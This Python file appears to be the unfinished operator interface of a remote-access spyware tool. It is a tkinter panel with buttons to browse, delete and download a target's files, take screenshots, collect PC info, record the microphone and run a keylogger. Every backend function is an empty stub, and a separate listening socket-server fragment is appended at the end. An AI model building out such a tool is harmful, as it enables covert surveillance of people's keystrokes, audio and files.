from tkinter import *
from PIL import Image, ImageTk
from tkinter import messagebox
from functools import partial

import os
from os.path import join





def request_folder_names():
    pass


def request_files(folder_name):
    pass


def download(path):
    pass


def delete(path):
    pass



def request_screenshot(folder_name):
    pass


def request_pcinfo(folder_name):
    pass


def change_keylogger_impolse(folder_name, new_impolse):
    pass













root = Tk()
root.title('Data')
root.geometry('600x500+300+200')
root.configure(bg="#F4E9DD")
root.resizable(False, False)

frame = Frame(root, bg="white")
frame.place(relwidth=0.694, relheight=0.8, relx=0.15, rely=0.1)

folders = [".idea", "moyffb", "(123.,456g456sd456sg)"]

delete_icon = Image.open("delete.png")
delete_icon.thumbnail((23, 23))
delete_icon = ImageTk.PhotoImage(delete_icon)

download_icon = Image.open("download.png")
download_icon.thumbnail((23, 23))
download_icon = ImageTk.PhotoImage(download_icon)

refresh_icon = Image.open("refresh.png")
refresh_icon.thumbnail((50, 50))
refresh_icon = ImageTk.PhotoImage(refresh_icon)





def open_folder(folder_name):
    file_names = [f for f in os.listdir(folder_name) if os.path.isfile(join(folder_name, f))]

    screen = Toplevel(root)
    screen.title(folder_name)
    screen.geometry('600x600+300+200')
    screen.resizable(False, False)
    screen.configure(bg="#F4E9DD")
    frame1 = Frame(screen, bg="white")
    frame1.place(relwidth=0.694, relheight=0.8, relx=0.15, rely=0.02)

    # SCREEN-SHOT BUTTON
    screenshot_button = Button(screen, text="Screen-Shot", bg="#9f81f0", width=10)
    screenshot_button.place(x=130, y=500)
    # PC-INFO BUTTON
    pcInfo_button = Button(screen, text="PC-info", bg="#9f81f0", width=10)
    pcInfo_button.place(x=130, y=540)
    # MIC-RECORDER BUTTON
    microphone_button = Button(screen, text="Mic-record", bg="#9f81f0", width=10)
    microphone_button.place(x=350, y=500)
    mic_time_entry = Entry(screen, width=7, border=0.5)
    mic_time_entry.place(x=430, y=502)
    # KEYLOGGER BUTTON
    keylogger_button = Button(screen, text="key-logger", bg="#9f81f0", width=10)
    keylogger_button.place(x=350, y=540)
    keylogger_impulse = Entry(screen, width=7, border=0.5)
    keylogger_impulse.place(x=430, y=542)

    # Refresh button
    def refrsh():
        screen.destroy()
        open_folder(folder_name)

    refresh_button = Button(screen, image=refresh_icon, border=0.5, command=refrsh)
    refresh_button.place(x=10, y=10)

    for i in range(len(file_names)):
        # The partial function enables to functions with args to be used in button.command
        folder_label = Label(frame1, text=file_names[i], bg="grey", width=51, height=1, borderwidth=3, relief="ridge")
        folder_label.grid(row=i, column=0)

        special_function = partial(delete, folder_name + "\\" + file_names[i])
        delete_file_button = Button(frame1, image=delete_icon, border=0, command=special_function)
        delete_file_button.grid(row=i, column=1)

        download_folder_button = Button(frame1, image=download_icon, border=0)
        download_folder_button.grid(row=i, column=2)
    screen.mainloop()


refresh_button1 = Button(root, image=refresh_icon, border=0.5)
refresh_button1.place(x=10, y=10)
for i in range(len(folders)):
    # The partial function enables to functions with args to be used in button.command
    special_function = partial(open_folder, folders[i])
    folder_button = Button(frame, text=folders[i], bg="grey", width=51, height=1, border=0.5, command=special_function)
    folder_button.grid(row=i, column=0)

    # The partial function enables to functions with args to be used in button.command
    special_function = partial(delete, folders[i])
    delete_folder_button = Button(frame, image=delete_icon, border=0, command=special_function)
    delete_folder_button.grid(row=i, column=1)

    download_folder_button = Button(frame, image=download_icon, border=0)
    download_folder_button.grid(row=i, column=2)



root.mainloop()
import socket
PORT = 5050
SERVER = socket.gethostbyname(socket.gethostname())
ADDR = (SERVER, PORT)
class ServerSocket:

    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind(ADDR)
        self.sock.listen()




